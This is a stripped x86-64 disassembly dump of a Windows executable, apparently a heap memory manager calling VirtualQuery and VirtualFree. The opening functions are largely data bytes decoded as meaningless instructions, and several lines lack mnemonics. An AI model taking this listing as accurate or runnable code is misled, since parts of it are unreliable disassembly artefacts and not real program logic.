sub_402015
push 0x65
movsxd esi [ rax + rsi * 8 + 0x14 ]
add [ rax ] al
add [ rax ] al
add [ rax ] al
add [ rax ] al
add [ rax ] al
add [ rax ] al
add [ rax ] al
add [ rsi ] al
push rbx
jns r-xdata
add [ rax ] al
add [ rax ] al
add al dl
pop rcx
add [ rax ] al
add [ rax ] al
add al al
pop rcx
add [ rax ] al
add [ rax ] al
add [ rax ] al
pop rdx
add [ rax ] al
add [ rax ] al
add [ rax ] dl
pop rdx
add [ rax ] al
add [ rax ] al
add [ rax ] ah
pop rdx
add [ rax ] al
add [ rax ] al
add al dh
pop rcx
add [ rax ] al
add [ rax ] al
add [ rax + 0x72 ] ah
add [ rax ] al
add [ rax ] al
add [ rax + 0x4072 ] dl
add [ rax ] al
add [ rax + 0x54 ] dl
add [ rax ] al
add [ rax ] al
add [ rax + 0x4053 ] al
add [ rax ] al
add [ rax + 0x4053 ] dl
add [ rax ] al
add [ rax + 0x4053 ] ah
add [ rax ] al
add [ rax ] al
add [ rax ] al
add [ rax ] al
add [ rax ] al
add [ rax ] al
add [ rcx ] al
add [ rax ] al
cmp [ rax ] dl
add [ rax ] al
add [ rax ] al
add [ rax ] cl
add [ rax ] al
add [ rcx ] cl
js r-xdata
je r-xdata
add [ rax ] al
add [ rax ] al
add al 0x53
insb
add al [ rax ]
add [ rax ] bh
adc [ rax ] al
add [ rax ] al
add [ rax ] al
add [ rax ] al
or [ rbp + 0x78 ] al
imul esi [ rbx + rax * 2 + 0x6f ] 0x26564
add al [ rax ]
je r-xdata
add [ rax ] al
and [ rsi + 0x40 ] dl
add [ rax ] al
add [ rax ] al
add [ rax ] dh
push rsi
insd
add [ rax ] al
add [ rax ] al
add al [ rax ]
add [ rax ] al
add [ rax ] al
add [ rax ] al
add [ rax ] al
or [ rcx ] ah
add [ rax ] al
add [ rax ] al
add [ rax ] al
add [ rax ] al
add [ rax ] al
add [ rax ] al
add [ rax ] al
add [ rax ] al
add [ rax ] al
add [ rax ] al
add [ rax ] al
add [ rax ] al
add [ rax ] al
add [ rax ] al
add [ rax ] dh
and al [ rax ]
add [ rax ] al
add [ rax ] al
or [ rcx ] ah
add [ rax ] al
add [ rax ] al
add [ r-xdata ] ch
add [ rax ] al
add [ rax ] al
add [ rax ] al
add [ rax ] al
add [ rax ] al
add [ rdi + 0x21 ] dl
add [ rax ] al
add [ rax ] al
add [ rax ] bl
add [ rax ] al
add [ rax ] al
add [ rax ] al
add [ rax ] ch
adc al 0x40
add [ rax ] al
add [ rax ] al
add [ rax ] ah
push rsi
add [ rax ] al
add [ rax + 0x4071 ] dh
add [ rax ] al
add [ rsi ] al
jb r-xdata
outsd
add al [ gs : rax ]
add [ rax ] al
add eax [ rax ]
push 0x21
add [ rax ] al
add [ rax ] al
add [ rax + rax - 0xf ] al
push [ rdx + 0x4021 ]
add [ rax ] al
add [ rbx ] cl
cli
add [ rax ] al
add [ rbx + rdx * 2 ] al
insb
add al [ rax ]
add al [ rax ]
cmp [ rax ] al
nop
jb r-xdata
add [ rax ] al
add [ rax ] al
add [ rax ] al
add [ rsi + rax * 2 ] cl
jb r-xdata
insd
add [ rax ] al
add [ rax ] eax
add dh [ rax + 0x22 ]
add [ rax ] al
add [ rax ] al
add [ rdx ] al
add [ rdx ] al
add [ rax ] al
add [ rax ] bh
adc [ rax ] al
add [ rax ] al
add [ rax ] al
or [ rax ] al
add [ rax ] al
add [ rax ] al
add bh bh
add [ rax ] al
add [ rax ] al
add [ rax ] al
add [ rax ] al
add [ rax ] eax
add [ rax ] al
add [ rax ] al
add [ rax ] al
add [ rax ] al
add [ rax - 0x80000000 ] al
outsb
jae r-xdata
cmp [ rax ] dl
add [ rax ] al
add [ rax ] al
add [ rax ] cl
add [ rax ] al
add [ rax ] al
add [ rax ] al
inc [ rax ]
add [ rax ] al
add [ rax ] al
add [ rax ] al
add [ rcx ] al
add [ rax ] al
add [ rax ] al
add [ rax ] al
add [ rax ] al
add [ rax ] al
add [ rax ] 0x0
add [ rax + 0x4508ffff ] al
js r-xdata
int3
je r-xdata
loope r-xdata
outsd
int3
int3
add ah cl
int3
sub_40214e
add [ rax ] al
add [ rdx ] cl
sti
inc [ rax ]
add [ rdx ] dl
pop rdi
push rsp
js r-xdata
movsxd esp [ rbp + 0x3 ]
add [ rax ] cl
and [ rax ] al
add [ rax ] al
add [ rax ] al
sbb [ rax ] al
add [ rax ] eax
add [ rax ] al
add [ rax ] al
add [ rax ] al
add [ rax ] al
add [ rax ] al
add al 0x53
je r-xdata
add [ rax ] al
add [ rax ] al
add [ rax ] al
add [ rsi + rax * 2 ] cl
jb r-xdata
add [ rax ] al
or [ rbp + 0x78 ] al
imul esi [ rbx + rax * 2 + 0x6f ] 0x26564
add al [ rax ]
insb
insb
js r-xdata
insd
add [ rax ] al
add [ rax ] eax
add dh [ rax + 0x22 ]
add [ rax ] al
add [ rax ] al
add [ rdx ] al
add [ rdx ] al
add [ rax ] al
add [ rax ] bh
adc [ rax ] al
add [ rax ] al
add [ rax ] al
or [ rax ] al
add [ rax ] al
add [ rax ] al
add bh bh
add [ rax ] al
add [ rax ] al
add [ rax ] al
add [ rax ] al
add [ rax ] eax
add [ rax ] al
add [ rax ] al
add [ rax ] al
add [ rax ] al
add [ rax - 0x80000000 ] al
outsb
jae r-xdata
insb
add al [ rax ]
add al [ rax ]
cmp [ rax ] al
nop
jb r-xdata
add eax [ gs : rax ]
or [ rax ] ah
add [ rax ] al
add [ rax ] al
add [ rax ] bl
add [ rcx ] al
add [ rax ] al
add [ rax ] al
add [ rax ] al
jo r-xdata
cmp [ rax ] dl
add [ rax ] al
add [ rax ] al
add [ rax ] cl
add [ rax ] al
add [ rax ] al
add [ rax ] al
inc [ rax ]
add [ rax ] al
add [ rax ] al
add [ rax ] al
add [ rcx ] al
add [ rax ] al
add [ rax ] al
add [ rax ] al
add [ rax ] al
add [ rax ] al
add [ rax ] 0x0
add [ rax + 0x4508ffff ] al
js r-xdata
add [ rax ] al
imul ebp [ rdi + 0x6e ] 0x71b00048
add [ rax ] al
add [ rax ] al
add [ rsi ] al
jb r-xdata
int3
je r-xdata
add [ rax ] al
add [ rbx + rdx * 2 ] al
loope r-xdata
outsd
int3
int3
add ah cl
int3
sub_4024b0
push rbx
sub rsp 0x90
mov ebx 0xa
mov [ rsp + 0x28 ] 0x68
lea rcx [ rsp + 0x28 ]
call GetStartupInfoW
mov eax [ rsp + 0x64 ]
test eax 0x1
je r-xdata
mov eax ebx
add rsp 0x90
pop rbx
retn
movzx ebx [ rsp + 0x68 ]
sub_4026b0
sub rsp 0x28
cmp [ rw-data ] 0x0
je r-xdata
add rsp 0x28
retn
jmp r-xdata
xor rcx rcx
mov dl 0x1
lea r8 [ rw-data ]
call sub_4025f0
test al al
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
nop
xor rcx rcx
call sub_402510
xor rcx rcx
mov dl 0x1
lea r8 [ rw-data ]
call sub_4025f0
test al al
je r-xdata
mov ecx 0xa
call sub_402510
sub_402710
mov rax rcx
mov rcx [ rax + 0x8 ]
mov rdx [ rax ]
cmp rcx rdx
mov [ rcx ] rdx
mov [ rdx + 0x8 ] rcx
jne r-xdata
retn
lea r8 [ rw-data ]
sub rcx r8
mov edx ecx
shr ecx 0x4
shr edx 0x9
mov eax 0xfffffffe
rol eax cl
lea r8 [ rw-data ]
and [ r8 + rdx * 4 ] eax
jne r-xdata
mov eax 0xfffffffe
mov ecx edx
rol eax cl
and [ rw-data ] eax
sub_402760
mov rax rcx
sub edx 0xb30
shr edx 0x8
sub edx 0x3ff
sbb ecx ecx
and edx ecx
add edx 0x3ff
mov r9 rdx
lea rcx [ rw-data ]
shl edx 0x4
add rcx rdx
mov rdx [ rcx + 0x8 ]
cmp rdx rcx
mov [ rax ] rcx
mov [ rax + 0x8 ] rdx
mov [ rdx ] rax
mov [ rcx + 0x8 ] rax
jne r-xdata
retn
mov rcx r9
mov rdx r9
shr edx 0x5
mov eax 0x1
shl eax cl
lea r8 [ rw-data ]
or [ r8 + rdx * 4 ] eax
mov eax 0x1
mov ecx edx
shl eax cl
or [ rw-data ] eax
sub_4027d0
push rbp
sub rsp 0x20
mov rbp rsp
xor eax eax
cmp [ rw-data ] eax
je r-xdata
lea rsp [ rbp + 0x20 ]
pop rbp
retn
mov rax [ rw-data ]
test [ rax - 0x8 ] 0x1
jne r-xdata
mov rdx 0xfffffffffffffff0
and rdx [ rax - 0x8 ]
cmp edx 0xb30
jb r-xdata
or [ rax - 0x8 ] 0x8
mov edx [ rw-data ]
sub rax rdx
mov ecx [ rw-data ]
sub rax rcx
add edx ecx
jmp r-xdata
mov rcx rax
call sub_402710
mov rax [ rw-data ]
mov rdx 0xfffffffffffffff0
and rdx [ rax - 0x8 ]
mov rcx rax
call sub_402760
jmp r-xdata
lea rcx [ rdx + 0x3 ]
mov [ rax - 0x8 ] rcx
mov [ rdx + rax - 0x10 ] rdx
cmp edx 0xb30
jb r-xdata
sub_402870
push rbx
sub rsp 0x20
mov ebx ecx
call sub_4027d0
xor rcx rcx
mov edx 0x13fff0
mov r8d 0x1000
mov r9d 0x4
call sub_4024f0
mov rcx rax
test rcx rcx
je r-xdata
mov [ rw-data ] 0x0
xor rax rax
mov rax [ rw-data ]
lea rdx [ rw-data ]
mov [ rcx ] rdx
mov [ rw-data ] rcx
mov [ rcx + 0x8 ] rax
mov [ rax ] rcx
mov [ rcx + 0x13ffe8 ] 0x2
mov eax 0x13ffd0
sub eax ebx
mov [ rw-data ] eax
mov eax ebx
neg rax
lea rax [ rcx + rax + 0x13fff0 ]
mov [ rw-data ] rax
or ebx 0x2
mov ebx ebx
mov [ rax - 0x8 ] rbx
jmp r-xdata
add rsp 0x20
pop rbx
retn
sub_402910
sub rsp 0x28
cmp [ rw-data ] 0x0
je r-xdata
add rsp 0x28
retn
jmp r-xdata
xor rcx rcx
mov dl 0x1
lea r8 [ rw-data ]
call sub_4025f0
test al al
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
nop
xor rcx rcx
call sub_402510
xor rcx rcx
mov dl 0x1
lea r8 [ rw-data ]
call sub_4025f0
test al al
je r-xdata
mov ecx 0xa
call sub_402510
sub_402970
push rdi
push rsi
push rbx
sub rsp 0x20
mov rbx rcx
lea rdi [ rbx + 0x10027 ]
and rdi 0xffffffffffff0000
xor rcx rcx
mov rdx rdi
mov r8d 0x101000
mov r9d 0x4
call sub_4024f0
mov rsi rax
test rsi rsi
je r-xdata
mov rax rsi
add rsp 0x20
pop rbx
pop rsi
pop rdi
retn
mov [ rsi + 0x10 ] rbx
or rdi 0x4
mov [ rsi + 0x18 ] rdi
call sub_402910
mov rax [ rw-data ]
lea rcx [ rw-data ]
mov [ rsi ] rcx
mov [ rw-data ] rsi
mov [ rsi + 0x8 ] rax
mov [ rax ] rsi
mov [ rw-data ] 0x0
add rsi 0x20
sub_4029f0
push rbp
push r14
push r13
push rdi
push rsi
push rbx
sub rsp 0x58
mov rbp rsp
mov rbx rcx
sub rbx 0x20
call sub_402910
mov rsi [ rbx ]
mov rdi [ rbx + 0x8 ]
mov rax [ rbx + 0x18 ]
test rax 0x8
jne r-xdata
mov r13 rbx
mov r14 [ rbx + 0x18 ]
and r14 0xfffffffffffffff0
xor rbx rbx
mov rcx rbx
xor rdx rdx
mov r8d 0x8000
call VirtualFree
test eax eax
je r-xdata
cmp [ rbp + 0x38 ] r14
jae r-xdata
or ebx 0xffffffff
jmp r-xdata
or ebx 0xffffffff
jmp r-xdata
xor rbx rbx
jmp r-xdata
nop
sub r14 [ rbp + 0x38 ]
add r13 [ rbp + 0x38 ]
jmp r-xdata
test ebx ebx
jne r-xdata
mov [ rw-data ] 0x0
mov eax ebx
lea rsp [ rbp + 0x58 ]
pop rbx
pop rsi
pop rdi
pop r13
pop r14
pop rbp
retn
mov [ rdi ] rsi
mov [ rsi + 0x8 ] rdi
mov rcx r13
lea rdx [ rbp + 0x20 ]
mov r8d 0x30
call VirtualQuery
mov rcx r13
xor rdx rdx
mov r8d 0x8000
call VirtualFree
test eax eax
jne r-xdata
sub_402ab0
push rbp
push r14
push r13
push rdi
push rsi
push rbx
sub rsp 0x58
mov rbp rsp
mov rbx rcx
mov rsi rdx
mov rax [ rbx - 0x8 ]
mov rcx rax
and rcx 0xfffffffffffffff0
lea rdi [ rcx - 0x28 ]
cmp rsi rdi
jbe r-xdata
shr rdi 0x1
cmp rsi rdi
jb r-xdata
mov rcx rdi
shr rcx 0x2
lea r13 [ rdi + rcx ]
cmp rsi r13
jb r-xdata
mov rcx rsi
call sub_402c30
mov rdi rax
test rdi rdi
je r-xdata
mov rdi rbx
mov [ rbx - 0x10 ] rsi
jmp r-xdata
and rax 0xfffffffffffffff0
lea r14 [ rbx + rax - 0x20 ]
mov rcx r14
lea rdx [ rbp + 0x20 ]
mov r8d 0x30
call VirtualQuery
cmp [ rbp + 0x40 ] 0x10000
jne r-xdata
mov r13 rsi
mov rax rdi
lea rsp [ rbp + 0x58 ]
pop rbx
pop rsi
pop rdi
pop r13
pop r14
pop rbp
retn
cmp rsi 0x40a28
jbe r-xdata
mov rcx r13
call sub_402c30
mov rdi rax
test rdi rdi
je r-xdata
and [ rbp + 0x38 ] 0xffffffffffff0000
mov rax rdi
neg rax
lea rax [ rsi + rax ]
cmp [ rbp + 0x38 ] rax
jbe r-xdata
mov rcx rbx
mov rdx rdi
mov r8 rsi
call sub_402680
mov rcx rbx
call sub_403000
mov [ rbx - 0x10 ] rsi
cmp r13 0x40a28
jbe r-xdata
neg rdi
lea rdi [ r13 + rdi + 0xffff ]
and rdi 0xffffffffffff0000
cmp rdi [ rbp + 0x38 ]
jbe r-xdata
mov rax [ rbx - 0x10 ]
mov rcx rbx
mov rdx rdi
mov r8 rax
call sub_402680
mov rcx rbx
call sub_403000
jmp r-xdata
mov [ rdi - 0x10 ] rsi
mov rcx r14
mov rdx rdi
mov r8d 0x2000
mov r9d 0x4
call sub_4024f0
test rax rax
je r-xdata
mov rdi [ rbp + 0x38 ]
mov rcx r14
mov rdx rdi
mov r8d 0x1000
mov r9d 0x4
call sub_4024f0
test rax rax
je r-xdata
mov [ rbx - 0x10 ] rsi
mov rax [ rbx - 0x8 ]
lea rax [ rax + rdi ]
or rax 0x8
mov [ rbx - 0x8 ] rax
mov rdi rbx
jmp r-xdata
sub_402c30
push rbp
push rdi
push rsi
push rbx
sub rsp 0x28
mov rbp rsp
lea edx [ ecx + 0x7 ]
shr edx 0x3
lea r8 [ rw-data ]
lea rbx [ rw-data ]
movzx esi [ rw-data ]
cmp rcx 0xa28
ja r-xdata
cmp rcx 0x40a28
ja r-xdata
movzx ecx [ rdx + r8 ]
shl ecx 0x4
add rbx rcx
test esi esi
jne r-xdata
xor rax rax
test rcx rcx
js r-xdata
lea ebx [ ecx + 0xd7 ]
and ebx 0xffffff00
add ebx 0x30
test esi esi
je r-xdata
mov eax 0x100
[ rbx ] ah
je r-xdata
mov rdx [ rbx + 0x8 ]
mov rax [ rdx + 0x18 ]
mov rcx 0xfffffffffffffff8
cmp rdx rbx
je r-xdata
lea rsp [ rbp + 0x28 ]
pop rbx
pop rsi
pop rdi
pop rbp
retn
call sub_402970
lea edx [ ebx - 0xb30 ]
mov ecx edx
shr edx 0xd
shr ecx 0x8
mov eax 0xffffffff
shl eax cl
lea r8 [ rw-data ]
and eax [ r8 + rdx * 4 ]
je r-xdata
call sub_4026b0
add rbx 0x40
mov eax 0x100
[ rbx ] ah
je r-xdata
mov rdx [ rbx + 0x28 ]
movzx ecx [ rbx + 0x2 ]
add rcx rax
cmp rax [ rbx + 0x20 ]
ja r-xdata
add [ rdx + 0x20 ] 0x1
and rcx [ rax - 0x8 ]
mov [ rdx + 0x18 ] rcx
mov [ rax - 0x8 ] rdx
je r-xdata
mov eax 0xfffffffe
mov ecx edx
shl eax cl
and eax [ rw-data ]
je r-xdata
and ecx 0xffffffe0
bsf eax eax
or ecx eax
jmp r-xdata
add rbx 0x40
mov eax 0x100
[ rbx ] ah
je r-xdata
test esi esi
je r-xdata
add [ rdx + 0x20 ] 0x1
mov [ rbx + 0x18 ] rcx
mov [ rbx ] 0x0
mov [ rax - 0x8 ] rdx
jmp r-xdata
mov rcx [ rdx + 0x8 ]
mov [ rcx + 0x10 ] rbx
mov [ rbx + 0x8 ] rcx
mov [ rbx ] 0x0
jmp r-xdata
mov [ rbx ] 0x0
jmp r-xdata
mov ecx [ rw-data ]
sub ecx ebx
jb r-xdata
bsf edx eax
mov eax [ r8 + rdx * 4 ]
bsf ecx eax
mov eax edx
shl eax 0x5
or ecx eax
jmp r-xdata
lea rdi [ rw-data ]
lea eax [ ecx + ecx ]
lea rdi [ rdi + rax * 8 ]
mov rsi [ rdi + 0x8 ]
mov rax [ rsi + 0x8 ]
mov [ rdi + 0x8 ] rax
mov [ rax ] rdi
cmp rdi rax
jne r-xdata
sub rbx 0x80
pause
lea rax [ rw-data ]
cmp [ rax ] 0x0
jne r-xdata
movsx esi [ rbx + 0x1 ]
and esi [ rw-data ]
je r-xdata
call sub_4026b0
mov ecx ebx
call sub_402870
mov rax [ rw-data ]
sub rax rbx
mov [ rw-data ] rax
mov [ rw-data ] ecx
or rbx 0x2
mov [ rax - 0x8 ] rbx
jmp r-xdata
mov rdi 0xfffffffffffffff0
and rdi [ rsi - 0x8 ]
mov edx edi
sub edx ebx
je r-xdata
mov eax 0xfffffffe
rol eax cl
lea r8 [ rw-data ]
and [ r8 + rdx * 4 ] eax
jne r-xdata
mov ecx 0x0
call sub_402510
mov eax 0x100
[ rbx ] ah
je r-xdata
movzx ecx [ rbx + 0x4 ]
mov edi [ rw-data ]
cmp edi ecx
jb r-xdata
bsf eax esi
lea r8 [ rw-data ]
lea r9 [ rax * 4 ]
mov ecx [ r9 + r8 ]
bsf ecx ecx
lea ecx [ ecx + r9d * 8 ]
lea rdi [ rw-data ]
lea esi [ ecx * 8 ]
lea rdi [ rdi + rsi * 2 ]
mov rsi [ rdi + 0x8 ]
mov rdx [ rsi + 0x8 ]
mov [ rdi + 0x8 ] rdx
mov [ rdx ] rdi
cmp rdi rdx
jne r-xdata
xor cl cl
mov [ rw-data ] cl
jmp r-xdata
and [ rdi + rsi - 0x8 ] 0xf7
lea rcx [ rbx + rsi ]
lea rax [ rdx + 0x3 ]
mov [ rcx - 0x8 ] rax
mov [ rdx + rcx - 0x10 ] rdx
cmp edx 0xb30
jb r-xdata
btr [ rw-data ] edx
mov ecx 0xa
call sub_402510
jmp r-xdata
movzx ecx [ rbx + 0x6 ]
mov edi ecx
call sub_402870
mov rsi rax
test rax rax
jne r-xdata
mov rsi [ rw-data ]
movzx ecx [ rbx + 0x6 ]
lea edx [ ecx + 0xb30 ]
cmp edi edx
jb r-xdata
mov rdi 0xfffffffffffffff0
and rdi [ rsi - 0x8 ]
cmp edi 0x10a60
jb r-xdata
mov edx 0xfffffffe
rol edx cl
and [ r9 + r8 ] edx
jne r-xdata
lea rcx [ rbx + 0x2 ]
mov [ rsi - 0x8 ] rcx
xor cl cl
mov [ rw-data ] cl
mov rax rsi
jmp r-xdata
call sub_402760
jmp r-xdata
lea ecx [ edi + 0x6 ]
mov [ rsi - 0x8 ] rcx
xor eax eax
mov [ rw-data ] al
mov [ rsi ] rbx
mov [ rsi + 0x18 ] rax
mov [ rsi + 0x20 ] 0x1
mov [ rbx + 0x28 ] rsi
lea rax [ rsi + 0x30 ]
movzx ecx [ rbx + 0x2 ]
lea rdx [ rcx + rax ]
mov [ rbx + 0x18 ] rdx
add rdi rsi
sub rdi rcx
mov [ rbx + 0x20 ] rdi
mov [ rbx ] 0x0
mov [ rax - 0x8 ] rsi
jmp r-xdata
mov [ rw-data ] al
mov [ rbx ] al
jmp r-xdata
sub rsi rdi
sub [ rw-data ] edi
mov [ rw-data ] rsi
jmp r-xdata
mov edi ecx
and [ rdi + rsi - 0x8 ] 0xf7
mov edx edi
movzx edi [ rbx + 0x6 ]
sub edx edi
lea rcx [ rdi + rsi ]
lea rax [ rdx + 0x3 ]
mov [ rcx - 0x8 ] rax
mov [ rdx + rcx - 0x10 ] rdx
call sub_402760
jmp r-xdata
btr [ rw-data ] eax
sub_403000
push rbp
push rsi
push rbx
sub rsp 0x20
mov rbp rsp
mov rdx [ rcx - 0x8 ]
test dl 0x7
mov bl [ rw-data ]
jne r-xdata
test dl 0x5
jne r-xdata
test bl bl
mov rbx [ rdx ]
jne r-xdata
mov eax 0xffffffff
test dl 0x3
jne r-xdata
and rdx 0xfffffffffffffff0
test bl bl
mov rbx rdx
mov rsi rcx
je r-xdata
mov eax 0x100
[ rbx ] ah
je r-xdata
sub [ rdx + 0x20 ] 0x1
mov rax [ rdx + 0x18 ]
je r-xdata
lea rsp [ rbp + 0x20 ]
pop rbx
pop rsi
pop rbp
retn
call sub_4029f0
test [ rbx + rsi - 0x8 ] 0x1
mov rcx [ rbx + rsi - 0x8 ]
jne r-xdata
call sub_4026b0
pause
lea rax [ rw-data ]
test [ rax ] 0x0
jne r-xdata
test rax rax
je r-xdata
test rax rax
mov [ rdx + 0x18 ] rcx
lea rax [ rax + 0x1 ]
mov [ rcx - 0x8 ] rax
je r-xdata
lea rax [ rbx + rsi ]
and rcx 0xfffffffffffffff0
add rbx rcx
cmp rcx 0xb30
jb r-xdata
or rcx 0x8
mov [ rbx + rsi - 0x8 ] rcx
mov rsi rcx
mov ecx 0x0
call sub_402510
mov rcx rsi
mov rdx [ rcx - 0x8 ]
mov eax 0x100
[ rbx ] ah
je r-xdata
mov [ rbx + 0x20 ] rax
mov rax [ rdx + 0x10 ]
mov rcx [ rdx + 0x8 ]
mov [ rax + 0x8 ] rcx
mov [ rcx + 0x10 ] rax
xor rax rax
cmp [ rbx + 0x28 ] rdx
jne r-xdata
mov rcx [ rbx + 0x8 ]
mov [ rdx + 0x10 ] rbx
mov [ rdx + 0x8 ] rcx
mov [ rcx + 0x10 ] rdx
mov [ rbx + 0x8 ] rdx
mov [ rbx ] 0x0
xor eax eax
jmp r-xdata
xor eax eax
mov [ rbx ] al
jmp r-xdata
test [ rsi - 0x8 ] 0x8
jne r-xdata
mov rcx rax
call sub_402710
jmp r-xdata
mov rcx [ rsi - 0x10 ]
sub rsi rcx
add rbx rcx
cmp ecx 0xb30
jb r-xdata
cmp ebx 0x13ffd0
je r-xdata
mov rsi rcx
mov ecx 0xa
call sub_402510
mov rcx rsi
mov rdx [ rcx - 0x8 ]
jmp r-xdata
mov [ rbx ] al
mov rcx rdx
mov rdx [ rdx - 0x8 ]
mov bl [ rw-data ]
jmp r-xdata
mov rcx rsi
call sub_402710
jmp r-xdata
lea r8 [ rw-data ]
cmp [ r8 ] 0x13ffd0
jne r-xdata
lea rax [ rbx + 0x3 ]
mov [ rsi - 0x8 ] rax
mov [ rbx + rsi - 0x10 ] rbx
mov rcx rsi
mov rdx rbx
call sub_402760
xor eax eax
mov [ rw-data ] al
jmp r-xdata
lea rbx [ rsi + 0x13ffd0 ]
call sub_4027d0
mov [ rbx - 0x8 ] 0x2
lea rax [ rw-data ]
mov [ rax ] 0x13ffd0
mov [ rw-data ] rbx
xor eax eax
mov [ rw-data ] al
jmp r-xdata
sub rsi 0x20
mov rax [ rsi ]
mov rdx [ rsi + 0x8 ]
mov [ rax + 0x8 ] rdx
mov [ rdx ] rax
xor eax eax
mov [ rw-data ] al
mov rcx rsi
xor edx edx
mov r8d 0x8000
call VirtualFree
cmp eax 0x1
sbb eax eax
jmp r-xdata
sub_403220
push rbp
push r15
push r14
push rdi
push rsi
push rbx
sub rsp 0x28
mov rbp rsp
mov rsi rcx
mov rcx [ rcx - 0x8 ]
test cl 0x7
jne r-xdata
test cl 0x5
jne r-xdata
mov rbx [ rcx ]
movzx ecx [ rbx + 0x2 ]
sub ecx 0x8
cmp rcx rdx
jb r-xdata
test cl 0x3
jne r-xdata
mov rbx rcx
and ecx 0xfffffff0
lea rdi [ rcx + rsi ]
sub ecx 0x8
and ebx 0xf
cmp rdx rcx
ja r-xdata
lea ecx [ ecx + ecx + 0x20 ]
mov rdi rdx
xor rax rax
sub rcx rdx
adc rax 0xffffffffffffffff
and rcx rax
add rcx rdx
call sub_402c30
test rax rax
je r-xdata
lea ebx [ edx * 4 + 0x40 ]
cmp ebx ecx
jb r-xdata
xor eax eax
mov rcx rsi
call sub_402ab0
jmp r-xdata
mov rax [ rdi - 0x8 ]
test al 0x1
je r-xdata
lea r15 [ rdx + rdx ]
cmp r15 rcx
jb r-xdata
lea rsp [ rbp + 0x28 ]
pop rbx
pop rsi
pop rdi
pop r14
pop r15
pop rbp
retn
cmp rdi 0x40a28
jbe r-xdata
mov rbx rdx
mov rcx rdx
call sub_402c30
test rax rax
je r-xdata
mov rax rsi
jmp r-xdata
mov eax ecx
shr eax 0x2
add eax ecx
xor rdi rdi
sub rax rdx
adc rdi 0xffffffffffffffff
and rax rdi
add rax rdx
mov r15 rax
mov edi ecx
mov rbx rdx
mov rcx rax
call sub_402c30
mov rdx rbx
test eax eax
je r-xdata
and rax 0xfffffffffffffff0
lea r15 [ rcx + rax ]
cmp rdx r15
ja r-xdata
cmp edx 0xb28
jae r-xdata
mov rax rsi
jmp r-xdata
movzx r8d [ rbx + 0x2 ]
sub r8d 0x8
mov rdx rax
mov rdi rax
mov rcx rsi
call [ rbx + 0x30 ]
mov rcx rsi
call sub_403000
mov rax rdi
jmp r-xdata
mov [ rax - 0x10 ] rdi
mov r8 rbx
mov rdx rax
mov rbx rax
mov rcx rsi
call sub_402680
mov rcx rsi
call sub_403000
mov rax rbx
jmp r-xdata
cmp r15 0x40a28
jbe r-xdata
lea r8 [ rw-data ]
cmp [ r8 ] 0x0
je r-xdata
lea r15 [ rdx + 0xd7 ]
and r15 0xffffffffffffff00
add r15 0x30
add ecx 0x8
sub ecx r15d
lea r8 [ rw-data ]
cmp [ r8 ] 0x0
je r-xdata
cmp edx 0x2cc
jb r-xdata
mov r15 rax
mov rdx rax
mov rcx rsi
mov r8 rdi
call sub_402680
mov rcx rsi
call sub_403000
mov rax r15
jmp r-xdata
mov [ rax - 0x10 ] rdx
cmp eax 0xb30
jb r-xdata
mov rbx rcx
mov r15 rdx
call sub_4026b0
mov rcx rbx
mov rdx r15
mov rbx 0xf
and rbx [ rsi - 0x8 ]
mov rax [ rdi - 0x8 ]
test al 0x1
je r-xdata
or rbx r15
mov [ rsi - 0x8 ] rbx
mov ebx ecx
mov rdx [ rdi - 0x8 ]
test dl 0x1
jne r-xdata
mov ebx ecx
call sub_4026b0
mov ecx ebx
mov rbx 0xf
and rbx [ rsi - 0x8 ]
mov rdi rdx
mov rcx rdx
call sub_402c30
test rax rax
je r-xdata
mov edx 0xb28
cmp ecx edx
jbe r-xdata
mov eax ecx
shr eax 0x2
add eax ecx
xor edi edi
sub eax edx
adc edi 0xffffffff
and eax edi
lea eax [ edx + eax + 0xd7 ]
and eax 0xffffff00
add eax 0x30
lea rdx [ r15 + 0x8 ]
sub edx eax
ja r-xdata
mov r14 rcx
mov rcx rdi
mov rdi rdx
call sub_402710
mov rcx r14
mov rdx rdi
lea rax [ rw-data ]
mov [ rax ] 0x0
and eax 0xfffffff0
lea r15 [ rcx + rax ]
cmp rdx r15
ja r-xdata
mov rcx rdi
and rdx 0xfffffffffffffff0
add rbx rdx
add rdi rdx
cmp edx 0xb30
jb r-xdata
or rdx 0x8
mov [ rdi - 0x8 ] rdx
jmp r-xdata
mov r15 rax
mov rdx rax
mov rcx rsi
mov r8 rdi
call sub_402680
mov rcx rsi
call sub_403000
mov rax r15
jmp r-xdata
mov [ r15 + rsi - 0x8 ] rdx
lea edi [ edx + 0x3 ]
mov [ rax + rsi - 0x8 ] rdi
mov r15 rax
cmp edx 0xb30
jb r-xdata
and [ r15 + rsi ] 0xfffffffffffffff7
add r15 0x8
jmp r-xdata
mov [ rdi - 0x10 ] rbx
lea rcx [ rbx + 0x3 ]
mov [ r15 + rsi - 0x8 ] rcx
cmp rbx 0xb30
jb r-xdata
call sub_402710
or r15 rbx
mov [ rsi - 0x8 ] r15
lea rax [ rw-data ]
mov [ rax ] 0x0
mov rax rsi
jmp r-xdata
lea rcx [ rax + rsi ]
call sub_402760
lea rax [ rw-data ]
mov [ rax ] 0x0
mov rax rsi
jmp r-xdata
lea rcx [ r15 + rsi ]
mov rdx rbx
call sub_402760
sub_4035a0
push rbp
push rbx
sub rsp 0x28
mov rbp rsp
lea rbx [ rcx - 0x1 ]
and rbx 0xfffffffffffffff8
call sub_402c30
cmp rax 0x1
sbb rcx rcx
lea rdx [ rbx + rax ]
or rbx rcx
je r-xdata
xor rcx rcx
mov [ rdx ] rcx
cmp rbx 0x40a28
jae r-xdata
lea rsp [ rbp + 0x28 ]
pop rbx
pop rbp
retn
neg rbx
pxor xmm0 xmm0
movdqa [ rbx + rdx ] xmm0
add rbx 0x10
js r-xdata
sub_403620
cmp [ rw-data ] 0x0
je r-xdata
lea rax [ rcx + 0x20 ]
jmp r-xdata
cmp [ rw-data ] rcx
jb r-xdata
retn
lea rax [ rcx + 0x13fff0 ]
cmp [ rw-data ] rax
jbe r-xdata
cmp [ rw-data ] 0x13ffd0
je r-xdata
xor rax rax
mov rax [ rw-data ]
jmp r-xdata
sub_403670
lea rax [ rcx + 0x30 ]
mov [ rdx ] rax
mov rax [ rcx ]
cmp [ rax + 0x28 ] rcx
jne r-xdata
mov eax [ rcx - 0x8 ]
and eax 0xfffffff0
mov eax eax
lea rax [ rcx + rax ]
mov rcx [ rcx ]
movzx rcx [ rcx + 0x2 ]
neg rcx
lea rax [ rax + rcx ]
mov [ r8 ] rax
jmp r-xdata
mov rax [ rcx ]
mov rdx [ rcx ]
mov rax [ rax + 0x18 ]
